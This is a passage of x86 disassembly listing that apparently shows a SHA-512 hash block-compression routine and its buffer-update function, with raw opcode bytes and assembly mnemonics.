  404780:	8b 44 24 44          	mov    0x44(%esp),%eax
  404784:	c1 e8 02             	shr    $0x2,%eax
  404787:	0b c8                	or     %eax,%ecx
  404789:	8b 44 24 44          	mov    0x44(%esp),%eax
  40478d:	33 d1                	xor    %ecx,%edx
  40478f:	c1 e0 04             	shl    $0x4,%eax
  404792:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  404796:	c1 e9 1c             	shr    $0x1c,%ecx
  404799:	0b c8                	or     %eax,%ecx
  40479b:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  40479f:	33 d1                	xor    %ecx,%edx
  4047a1:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4047a5:	33 c8                	xor    %eax,%ecx
  4047a7:	23 44 24 34          	and    0x34(%esp),%eax
  4047ab:	23 4c 24 28          	and    0x28(%esp),%ecx
  4047af:	33 c8                	xor    %eax,%ecx
  4047b1:	03 d1                	add    %ecx,%edx
  4047b3:	3b f7                	cmp    %edi,%esi
  4047b5:	8d 0c 2e             	lea    (%esi,%ebp,1),%ecx
  4047b8:	8b 74 24 10          	mov    0x10(%esp),%esi
  4047bc:	1b c0                	sbb    %eax,%eax
  4047be:	f7 d8                	neg    %eax
  4047c0:	03 c3                	add    %ebx,%eax
  4047c2:	3b cd                	cmp    %ebp,%ecx
  4047c4:	8b 6c 24 58          	mov    0x58(%esp),%ebp
  4047c8:	1b c9                	sbb    %ecx,%ecx
  4047ca:	8b 5c 24 50          	mov    0x50(%esp),%ebx
  4047ce:	03 c2                	add    %edx,%eax
  4047d0:	f7 d9                	neg    %ecx
  4047d2:	03 c8                	add    %eax,%ecx
  4047d4:	23 dd                	and    %ebp,%ebx
  4047d6:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  4047da:	8b c5                	mov    %ebp,%eax
  4047dc:	f7 d0                	not    %eax
  4047de:	8b d6                	mov    %esi,%edx
  4047e0:	23 44 24 14          	and    0x14(%esp),%eax
  4047e4:	8b ce                	mov    %esi,%ecx
  4047e6:	33 d8                	xor    %eax,%ebx
  4047e8:	c1 e1 0e             	shl    $0xe,%ecx
  4047eb:	c1 ea 09             	shr    $0x9,%edx
  4047ee:	8b c5                	mov    %ebp,%eax
  4047f0:	c1 e0 17             	shl    $0x17,%eax
  4047f3:	0b d0                	or     %eax,%edx
  4047f5:	89 5c 24 78          	mov    %ebx,0x78(%esp)
  4047f9:	8b c5                	mov    %ebp,%eax
  4047fb:	c1 ed 0e             	shr    $0xe,%ebp
  4047fe:	c1 e8 12             	shr    $0x12,%eax
  404801:	0b c8                	or     %eax,%ecx
  404803:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404807:	33 d1                	xor    %ecx,%edx
  404809:	8b ce                	mov    %esi,%ecx
  40480b:	c1 e1 12             	shl    $0x12,%ecx
  40480e:	0b e9                	or     %ecx,%ebp
  404810:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  404814:	8b b4 04 6c 01 00 00 	mov    0x16c(%esp,%eax,1),%esi
  40481b:	33 ea                	xor    %edx,%ebp
  40481d:	03 eb                	add    %ebx,%ebp
  40481f:	c1 e9 0e             	shr    $0xe,%ecx
  404822:	8b 98 d4 f2 41 00    	mov    0x41f2d4(%eax),%ebx
  404828:	8b 44 24 54          	mov    0x54(%esp),%eax
  40482c:	8d 3c 2b             	lea    (%ebx,%ebp,1),%edi
  40482f:	8d 14 3e             	lea    (%esi,%edi,1),%edx
  404832:	03 c2                	add    %edx,%eax
  404834:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  404838:	8b 44 24 58          	mov    0x58(%esp),%eax
  40483c:	c1 e0 12             	shl    $0x12,%eax
  40483f:	0b c8                	or     %eax,%ecx
  404841:	8b 44 24 58          	mov    0x58(%esp),%eax
  404845:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  404849:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40484d:	c1 e0 0e             	shl    $0xe,%eax
  404850:	c1 e9 12             	shr    $0x12,%ecx
  404853:	0b c8                	or     %eax,%ecx
  404855:	8b 44 24 58          	mov    0x58(%esp),%eax
  404859:	31 4c 24 18          	xor    %ecx,0x18(%esp)
  40485d:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  404861:	c1 e8 09             	shr    $0x9,%eax
  404864:	c1 e1 17             	shl    $0x17,%ecx
  404867:	0b c8                	or     %eax,%ecx
  404869:	8b 44 24 10          	mov    0x10(%esp),%eax
  40486d:	31 4c 24 18          	xor    %ecx,0x18(%esp)
  404871:	8b c8                	mov    %eax,%ecx
  404873:	23 44 24 2c          	and    0x2c(%esp),%eax
  404877:	f7 d1                	not    %ecx
  404879:	23 4c 24 30          	and    0x30(%esp),%ecx
  40487d:	33 c8                	xor    %eax,%ecx
  40487f:	01 4c 24 18          	add    %ecx,0x18(%esp)
  404883:	3b d6                	cmp    %esi,%edx
  404885:	8b 54 24 18          	mov    0x18(%esp),%edx
  404889:	1b c0                	sbb    %eax,%eax
  40488b:	f7 d8                	neg    %eax
  40488d:	03 d0                	add    %eax,%edx
  40488f:	3b fb                	cmp    %ebx,%edi
  404891:	8b 5c 24 5c          	mov    0x5c(%esp),%ebx
  404895:	1b c0                	sbb    %eax,%eax
  404897:	f7 d8                	neg    %eax
  404899:	03 d0                	add    %eax,%edx
  40489b:	3b 5c 24 54          	cmp    0x54(%esp),%ebx
  40489f:	8b 74 24 40          	mov    0x40(%esp),%esi
  4048a3:	8b fe                	mov    %esi,%edi
  4048a5:	1b c0                	sbb    %eax,%eax
  4048a7:	8b ce                	mov    %esi,%ecx
  4048a9:	f7 d8                	neg    %eax
  4048ab:	03 d0                	add    %eax,%edx
  4048ad:	3b 6c 24 78          	cmp    0x78(%esp),%ebp
  4048b1:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  4048b5:	1b c0                	sbb    %eax,%eax
  4048b7:	c1 e9 02             	shr    $0x2,%ecx
  4048ba:	f7 d8                	neg    %eax
  4048bc:	c1 e7 04             	shl    $0x4,%edi
  4048bf:	03 d0                	add    %eax,%edx
  4048c1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4048c5:	03 90 d0 f2 41 00    	add    0x41f2d0(%eax),%edx
  4048cb:	03 94 04 68 01 00 00 	add    0x168(%esp,%eax,1),%edx
  4048d2:	8b c5                	mov    %ebp,%eax
  4048d4:	c1 e8 1c             	shr    $0x1c,%eax
  4048d7:	0b f8                	or     %eax,%edi
  4048d9:	03 54 24 20          	add    0x20(%esp),%edx
  4048dd:	8b c5                	mov    %ebp,%eax
  4048df:	89 54 24 18          	mov    %edx,0x18(%esp)
  4048e3:	c1 e0 1e             	shl    $0x1e,%eax
  4048e6:	0b c8                	or     %eax,%ecx
  4048e8:	8b c5                	mov    %ebp,%eax
  4048ea:	33 f9                	xor    %ecx,%edi
  4048ec:	c1 e0 19             	shl    $0x19,%eax
  4048ef:	8b ce                	mov    %esi,%ecx
  4048f1:	8b 74 24 44          	mov    0x44(%esp),%esi
  4048f5:	c1 e9 07             	shr    $0x7,%ecx
  4048f8:	0b c8                	or     %eax,%ecx
  4048fa:	8b 44 24 24          	mov    0x24(%esp),%eax
  4048fe:	33 f9                	xor    %ecx,%edi
  404900:	8b ce                	mov    %esi,%ecx
  404902:	33 4c 24 48          	xor    0x48(%esp),%ecx
  404906:	23 74 24 48          	and    0x48(%esp),%esi
  40490a:	23 cd                	and    %ebp,%ecx
  40490c:	33 f1                	xor    %ecx,%esi
  40490e:	8d 2c 18             	lea    (%eax,%ebx,1),%ebp
  404911:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  404915:	03 f7                	add    %edi,%esi
  404917:	3b e8                	cmp    %eax,%ebp
  404919:	1b c0                	sbb    %eax,%eax
  40491b:	c1 e9 07             	shr    $0x7,%ecx
  40491e:	f7 d8                	neg    %eax
  404920:	03 44 24 34          	add    0x34(%esp),%eax
  404924:	03 c2                	add    %edx,%eax
  404926:	8b 54 24 40          	mov    0x40(%esp),%edx
  40492a:	89 44 24 68          	mov    %eax,0x68(%esp)
  40492e:	8d 04 1e             	lea    (%esi,%ebx,1),%eax
  404931:	c1 e2 19             	shl    $0x19,%edx
  404934:	0b d1                	or     %ecx,%edx
  404936:	89 44 24 34          	mov    %eax,0x34(%esp)
  40493a:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  40493e:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  404942:	c1 e1 1e             	shl    $0x1e,%ecx
  404945:	c1 e8 02             	shr    $0x2,%eax
  404948:	0b c8                	or     %eax,%ecx
  40494a:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40494e:	33 d1                	xor    %ecx,%edx
  404950:	c1 e0 04             	shl    $0x4,%eax
  404953:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  404957:	c1 e9 1c             	shr    $0x1c,%ecx
  40495a:	0b c8                	or     %eax,%ecx
  40495c:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  404960:	33 d1                	xor    %ecx,%edx
  404962:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  404966:	33 c8                	xor    %eax,%ecx
  404968:	23 44 24 28          	and    0x28(%esp),%eax
  40496c:	23 4c 24 40          	and    0x40(%esp),%ecx
  404970:	33 c8                	xor    %eax,%ecx
  404972:	03 d1                	add    %ecx,%edx
  404974:	3b f7                	cmp    %edi,%esi
  404976:	8d 3c 1e             	lea    (%esi,%ebx,1),%edi
  404979:	1b c9                	sbb    %ecx,%ecx
  40497b:	f7 d9                	neg    %ecx
  40497d:	03 4c 24 18          	add    0x18(%esp),%ecx
  404981:	3b fb                	cmp    %ebx,%edi
  404983:	1b c0                	sbb    %eax,%eax
  404985:	f7 d8                	neg    %eax
  404987:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  40498b:	03 ca                	add    %edx,%ecx
  40498d:	8b 54 24 14          	mov    0x14(%esp),%edx
  404991:	03 c8                	add    %eax,%ecx
  404993:	8b 44 24 68          	mov    0x68(%esp),%eax
  404997:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40499b:	83 44 24 1c 40       	addl   $0x40,0x1c(%esp)
  4049a0:	81 7c 24 1c 80 02 00 	cmpl   $0x280,0x1c(%esp)
  4049a7:	00 
  4049a8:	8b 74 24 58          	mov    0x58(%esp),%esi
  4049ac:	89 94 24 b0 00 00 00 	mov    %edx,0xb0(%esp)
  4049b3:	8b 54 24 28          	mov    0x28(%esp),%edx
  4049b7:	89 4c 24 70          	mov    %ecx,0x70(%esp)
  4049bb:	89 94 24 c0 00 00 00 	mov    %edx,0xc0(%esp)
  4049c2:	89 94 24 e4 00 00 00 	mov    %edx,0xe4(%esp)
  4049c9:	8b 54 24 10          	mov    0x10(%esp),%edx
  4049cd:	89 4c 24 64          	mov    %ecx,0x64(%esp)
  4049d1:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  4049d5:	89 8c 24 90 00 00 00 	mov    %ecx,0x90(%esp)
  4049dc:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  4049e0:	89 8c 24 8c 00 00 00 	mov    %ecx,0x8c(%esp)
  4049e7:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4049eb:	89 8c 24 b8 00 00 00 	mov    %ecx,0xb8(%esp)
  4049f2:	89 8c 24 bc 00 00 00 	mov    %ecx,0xbc(%esp)
  4049f9:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  4049fd:	89 7c 24 7c          	mov    %edi,0x7c(%esp)
  404a01:	8b 7c 24 70          	mov    0x70(%esp),%edi
  404a05:	89 54 24 6c          	mov    %edx,0x6c(%esp)
  404a09:	8b d7                	mov    %edi,%edx
  404a0b:	89 4c 24 54          	mov    %ecx,0x54(%esp)
  404a0f:	89 9c 24 c8 00 00 00 	mov    %ebx,0xc8(%esp)
  404a16:	8b 5c 24 50          	mov    0x50(%esp),%ebx
  404a1a:	89 8c 24 e0 00 00 00 	mov    %ecx,0xe0(%esp)
  404a21:	89 8c 24 fc 00 00 00 	mov    %ecx,0xfc(%esp)
  404a28:	89 4c 24 74          	mov    %ecx,0x74(%esp)
  404a2c:	8b 4c 24 64          	mov    0x64(%esp),%ecx
  404a30:	89 bc 24 dc 00 00 00 	mov    %edi,0xdc(%esp)
  404a37:	8b 7c 24 34          	mov    0x34(%esp),%edi
  404a3b:	89 84 24 80 00 00 00 	mov    %eax,0x80(%esp)
  404a42:	89 ac 24 b4 00 00 00 	mov    %ebp,0xb4(%esp)
  404a49:	89 84 24 f0 00 00 00 	mov    %eax,0xf0(%esp)
  404a50:	89 ac 24 14 01 00 00 	mov    %ebp,0x114(%esp)
  404a57:	89 84 24 84 00 00 00 	mov    %eax,0x84(%esp)
  404a5e:	89 ac 24 1c 01 00 00 	mov    %ebp,0x11c(%esp)
  404a65:	89 84 24 20 01 00 00 	mov    %eax,0x120(%esp)
  404a6c:	89 ac 24 9c 00 00 00 	mov    %ebp,0x9c(%esp)
  404a73:	89 84 24 a0 00 00 00 	mov    %eax,0xa0(%esp)
  404a7a:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  404a7e:	89 ac 24 88 00 00 00 	mov    %ebp,0x88(%esp)
  404a85:	89 84 24 a4 00 00 00 	mov    %eax,0xa4(%esp)
  404a8c:	89 ac 24 a8 00 00 00 	mov    %ebp,0xa8(%esp)
  404a93:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%esp)
  404a9a:	89 b4 24 c4 00 00 00 	mov    %esi,0xc4(%esp)
  404aa1:	89 ac 24 cc 00 00 00 	mov    %ebp,0xcc(%esp)
  404aa8:	89 84 24 d0 00 00 00 	mov    %eax,0xd0(%esp)
  404aaf:	89 9c 24 d4 00 00 00 	mov    %ebx,0xd4(%esp)
  404ab6:	89 9c 24 d8 00 00 00 	mov    %ebx,0xd8(%esp)
  404abd:	89 ac 24 e8 00 00 00 	mov    %ebp,0xe8(%esp)
  404ac4:	89 84 24 ec 00 00 00 	mov    %eax,0xec(%esp)
  404acb:	89 b4 24 10 01 00 00 	mov    %esi,0x110(%esp)
  404ad2:	89 b4 24 f4 00 00 00 	mov    %esi,0xf4(%esp)
  404ad9:	89 94 24 f8 00 00 00 	mov    %edx,0xf8(%esp)
  404ae0:	89 ac 24 00 01 00 00 	mov    %ebp,0x100(%esp)
  404ae7:	89 ac 24 04 01 00 00 	mov    %ebp,0x104(%esp)
  404aee:	89 84 24 08 01 00 00 	mov    %eax,0x108(%esp)
  404af5:	89 94 24 0c 01 00 00 	mov    %edx,0x10c(%esp)
  404afc:	89 4c 24 78          	mov    %ecx,0x78(%esp)
  404b00:	0f 8c aa ef ff ff    	jl     0x403ab0
  404b06:	8b 8c 24 18 01 00 00 	mov    0x118(%esp),%ecx
  404b0d:	8b 84 24 2c 01 00 00 	mov    0x12c(%esp),%eax
  404b14:	03 c7                	add    %edi,%eax
  404b16:	3b c7                	cmp    %edi,%eax
  404b18:	89 41 04             	mov    %eax,0x4(%ecx)
  404b1b:	1b c0                	sbb    %eax,%eax
  404b1d:	f7 d8                	neg    %eax
  404b1f:	03 01                	add    (%ecx),%eax
  404b21:	03 c2                	add    %edx,%eax
  404b23:	89 01                	mov    %eax,(%ecx)
  404b25:	8b 84 24 24 01 00 00 	mov    0x124(%esp),%eax
  404b2c:	03 44 24 3c          	add    0x3c(%esp),%eax
  404b30:	3b 44 24 3c          	cmp    0x3c(%esp),%eax
  404b34:	89 41 0c             	mov    %eax,0xc(%ecx)
  404b37:	1b c0                	sbb    %eax,%eax
  404b39:	f7 d8                	neg    %eax
  404b3b:	03 41 08             	add    0x8(%ecx),%eax
  404b3e:	03 44 24 40          	add    0x40(%esp),%eax
  404b42:	89 41 08             	mov    %eax,0x8(%ecx)
  404b45:	8b 84 24 28 01 00 00 	mov    0x128(%esp),%eax
  404b4c:	03 44 24 44          	add    0x44(%esp),%eax
  404b50:	3b 44 24 44          	cmp    0x44(%esp),%eax
  404b54:	89 41 14             	mov    %eax,0x14(%ecx)
  404b57:	1b c0                	sbb    %eax,%eax
  404b59:	f7 d8                	neg    %eax
  404b5b:	03 41 10             	add    0x10(%ecx),%eax
  404b5e:	03 44 24 28          	add    0x28(%esp),%eax
  404b62:	89 41 10             	mov    %eax,0x10(%ecx)
  404b65:	8b 84 24 94 00 00 00 	mov    0x94(%esp),%eax
  404b6c:	03 44 24 48          	add    0x48(%esp),%eax
  404b70:	3b 44 24 48          	cmp    0x48(%esp),%eax
  404b74:	89 41 1c             	mov    %eax,0x1c(%ecx)
  404b77:	1b c0                	sbb    %eax,%eax
  404b79:	f7 d8                	neg    %eax
  404b7b:	03 41 18             	add    0x18(%ecx),%eax
  404b7e:	03 44 24 4c          	add    0x4c(%esp),%eax
  404b82:	89 41 18             	mov    %eax,0x18(%ecx)
  404b85:	8b 41 24             	mov    0x24(%ecx),%eax
  404b88:	03 c5                	add    %ebp,%eax
  404b8a:	3b c5                	cmp    %ebp,%eax
  404b8c:	89 41 24             	mov    %eax,0x24(%ecx)
  404b8f:	5f                   	pop    %edi
  404b90:	1b c0                	sbb    %eax,%eax
  404b92:	f7 d8                	neg    %eax
  404b94:	03 41 20             	add    0x20(%ecx),%eax
  404b97:	03 44 24 64          	add    0x64(%esp),%eax
  404b9b:	89 41 20             	mov    %eax,0x20(%ecx)
  404b9e:	8b 41 2c             	mov    0x2c(%ecx),%eax
  404ba1:	03 c6                	add    %esi,%eax
  404ba3:	3b c6                	cmp    %esi,%eax
  404ba5:	89 41 2c             	mov    %eax,0x2c(%ecx)
  404ba8:	5e                   	pop    %esi
  404ba9:	1b c0                	sbb    %eax,%eax
  404bab:	f7 d8                	neg    %eax
  404bad:	03 41 28             	add    0x28(%ecx),%eax
  404bb0:	03 44 24 08          	add    0x8(%esp),%eax
  404bb4:	89 41 28             	mov    %eax,0x28(%ecx)
  404bb7:	8b 41 34             	mov    0x34(%ecx),%eax
  404bba:	03 c3                	add    %ebx,%eax
  404bbc:	3b c3                	cmp    %ebx,%eax
  404bbe:	89 41 34             	mov    %eax,0x34(%ecx)
  404bc1:	5d                   	pop    %ebp
  404bc2:	1b c0                	sbb    %eax,%eax
  404bc4:	f7 d8                	neg    %eax
  404bc6:	03 41 30             	add    0x30(%ecx),%eax
  404bc9:	03 44 24 20          	add    0x20(%esp),%eax
  404bcd:	89 41 30             	mov    %eax,0x30(%ecx)
  404bd0:	8b 41 3c             	mov    0x3c(%ecx),%eax
  404bd3:	03 44 24 08          	add    0x8(%esp),%eax
  404bd7:	3b 44 24 08          	cmp    0x8(%esp),%eax
  404bdb:	89 41 3c             	mov    %eax,0x3c(%ecx)
  404bde:	1b c0                	sbb    %eax,%eax
  404be0:	f7 d8                	neg    %eax
  404be2:	03 41 38             	add    0x38(%ecx),%eax
  404be5:	03 44 24 24          	add    0x24(%esp),%eax
  404be9:	89 41 38             	mov    %eax,0x38(%ecx)
  404bec:	8b 8c 24 a4 03 00 00 	mov    0x3a4(%esp),%ecx
  404bf3:	5b                   	pop    %ebx
  404bf4:	33 cc                	xor    %esp,%ecx
  404bf6:	e8 cc 5a 00 00       	call   0x40a6c7
  404bfb:	81 c4 a4 03 00 00    	add    $0x3a4,%esp
  404c01:	c3                   	ret
  404c02:	cc                   	int3
  404c03:	cc                   	int3
  404c04:	cc                   	int3
  404c05:	cc                   	int3
  404c06:	cc                   	int3
  404c07:	cc                   	int3
  404c08:	cc                   	int3
  404c09:	cc                   	int3
  404c0a:	cc                   	int3
  404c0b:	cc                   	int3
  404c0c:	cc                   	int3
  404c0d:	cc                   	int3
  404c0e:	cc                   	int3
  404c0f:	cc                   	int3
  404c10:	81 ec 84 00 00 00    	sub    $0x84,%esp
  404c16:	53                   	push   %ebx
  404c17:	8b 9c 24 94 00 00 00 	mov    0x94(%esp),%ebx
  404c1e:	55                   	push   %ebp
  404c1f:	56                   	push   %esi
  404c20:	8b b4 24 94 00 00 00 	mov    0x94(%esp),%esi
  404c27:	8b ac 24 98 00 00 00 	mov    0x98(%esp),%ebp
  404c2e:	89 74 24 0c          	mov    %esi,0xc(%esp)
  404c32:	01 9e c4 00 00 00    	add    %ebx,0xc4(%esi)
  404c38:	39 9e c4 00 00 00    	cmp    %ebx,0xc4(%esi)
  404c3e:	1b c0                	sbb    %eax,%eax
  404c40:	f7 d8                	neg    %eax
  404c42:	01 86 c8 00 00 00    	add    %eax,0xc8(%esi)
  404c48:	39 86 c8 00 00 00    	cmp    %eax,0xc8(%esi)
  404c4e:	1b c0                	sbb    %eax,%eax
  404c50:	f7 d8                	neg    %eax
  404c52:	01 86 cc 00 00 00    	add    %eax,0xcc(%esi)
  404c58:	39 86 cc 00 00 00    	cmp    %eax,0xcc(%esi)
  404c5e:	1b c0                	sbb    %eax,%eax
  404c60:	f7 d8                	neg    %eax
  404c62:	01 86 d0 00 00 00    	add    %eax,0xd0(%esi)
  404c68:	8b 8e c0 00 00 00    	mov    0xc0(%esi),%ecx
  404c6e:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  404c71:	85 c9                	test   %ecx,%ecx
  404c73:	74 27                	je     0x404c9c
  404c75:	3d 80 00 00 00       	cmp    $0x80,%eax
  404c7a:	7d 2b                	jge    0x404ca7
  404c7c:	53                   	push   %ebx
  404c7d:	8d 46 40             	lea    0x40(%esi),%eax
  404c80:	03 c1                	add    %ecx,%eax
  404c82:	55                   	push   %ebp
  404c83:	50                   	push   %eax
  404c84:	e8 47 4a 00 00       	call   0x4096d0
  404c89:	83 c4 0c             	add    $0xc,%esp
  404c8c:	01 9e c0 00 00 00    	add    %ebx,0xc0(%esi)
  404c92:	5e                   	pop    %esi
  404c93:	5d                   	pop    %ebp
  404c94:	5b                   	pop    %ebx
  404c95:	81 c4 84 00 00 00    	add    $0x84,%esp
  404c9b:	c3                   	ret
  404c9c:	3d 80 00 00 00       	cmp    $0x80,%eax
  404ca1:	0f 8c b2 00 00 00    	jl     0x404d59
  404ca7:	57                   	push   %edi
  404ca8:	b8 80 00 00 00       	mov    $0x80,%eax
  404cad:	2b c1                	sub    %ecx,%eax
  404caf:	50                   	push   %eax
  404cb0:	8d 41 40             	lea    0x40(%ecx),%eax
  404cb3:	03 c6                	add    %esi,%eax
  404cb5:	55                   	push   %ebp
  404cb6:	50                   	push   %eax
  404cb7:	e8 14 4a 00 00       	call   0x4096d0
  404cbc:	8b 8e c0 00 00 00    	mov    0xc0(%esi),%ecx
  404cc2:	b8 80 00 00 00       	mov    $0x80,%eax
  404cc7:	2b c1                	sub    %ecx,%eax
  404cc9:	83 c3 80             	add    $0xffffff80,%ebx
  404ccc:	03 e8                	add    %eax,%ebp
  404cce:	83 c4 0c             	add    $0xc,%esp
  404cd1:	03 d9                	add    %ecx,%ebx
  404cd3:	8d 46 41             	lea    0x41(%esi),%eax
  404cd6:	33 ff                	xor    %edi,%edi
  404cd8:	8d 74 24 14          	lea    0x14(%esp),%esi
  404cdc:	0f 1f 40 00          	nopl   0x0(%eax)
  404ce0:	0f b6 50 ff          	movzbl -0x1(%eax),%edx
  404ce4:	8d 40 08             	lea    0x8(%eax),%eax
  404ce7:	0f b6 48 f8          	movzbl -0x8(%eax),%ecx
  404ceb:	c1 e2 08             	shl    $0x8,%edx
  404cee:	0b d1                	or     %ecx,%edx
  404cf0:	0f b6 48 f9          	movzbl -0x7(%eax),%ecx
  404cf4:	c1 e2 08             	shl    $0x8,%edx
  404cf7:	0b d1                	or     %ecx,%edx
  404cf9:	0f b6 48 fa          	movzbl -0x6(%eax),%ecx
  404cfd:	c1 e2 08             	shl    $0x8,%edx
  404d00:	0b d1                	or     %ecx,%edx
  404d02:	0f b6 48 fc          	movzbl -0x4(%eax),%ecx
  404d06:	89 14 fe             	mov    %edx,(%esi,%edi,8)
  404d09:	0f b6 50 fb          	movzbl -0x5(%eax),%edx
  404d0d:	c1 e2 08             	shl    $0x8,%edx
  404d10:	0b d1                	or     %ecx,%edx
  404d12:	0f b6 48 fd          	movzbl -0x3(%eax),%ecx
  404d16:	c1 e2 08             	shl    $0x8,%edx
  404d19:	0b d1                	or     %ecx,%edx
  404d1b:	0f b6 48 fe          	movzbl -0x2(%eax),%ecx
  404d1f:	c1 e2 08             	shl    $0x8,%edx
  404d22:	0b d1                	or     %ecx,%edx
  404d24:	89 54 fc 18          	mov    %edx,0x18(%esp,%edi,8)
  404d28:	47                   	inc    %edi
  404d29:	83 ff 10             	cmp    $0x10,%edi
  404d2c:	7c b2                	jl     0x404ce0
  404d2e:	8b 74 24 10          	mov    0x10(%esp),%esi
  404d32:	8d 44 24 14          	lea    0x14(%esp),%eax
  404d36:	50                   	push   %eax
  404d37:	56                   	push   %esi
  404d38:	e8 e3 e9 ff ff       	call   0x403720
  404d3d:	83 c4 08             	add    $0x8,%esp
  404d40:	c7 86 c0 00 00 00 00 	movl   $0x0,0xc0(%esi)
  404d47:	00 00 00 
  404d4a:	33 c9                	xor    %ecx,%ecx
  404d4c:	81 fb 80 00 00 00    	cmp    $0x80,%ebx
  404d52:	0f 8d 50 ff ff ff    	jge    0x404ca8
  404d58:	5f                   	pop    %edi
  404d59:	53                   	push   %ebx
  404d5a:	8d 46 40             	lea    0x40(%esi),%eax
  404d5d:	55                   	push   %ebp
  404d5e:	50                   	push   %eax
  404d5f:	e8 6c 49 00 00       	call   0x4096d0
  404d64:	83 c4 0c             	add    $0xc,%esp
  404d67:	89 9e c0 00 00 00    	mov    %ebx,0xc0(%esi)
  404d6d:	5e                   	pop    %esi
  404d6e:	5d                   	pop    %ebp
  404d6f:	5b                   	pop    %ebx
  404d70:	81 c4 84 00 00 00    	add    $0x84,%esp
  404d76:	c3                   	ret
  404d77:	cc                   	int3
  404d78:	cc                   	int3
  404d79:	cc                   	int3
  404d7a:	cc                   	int3
  404d7b:	cc                   	int3
  404d7c:	cc                   	int3
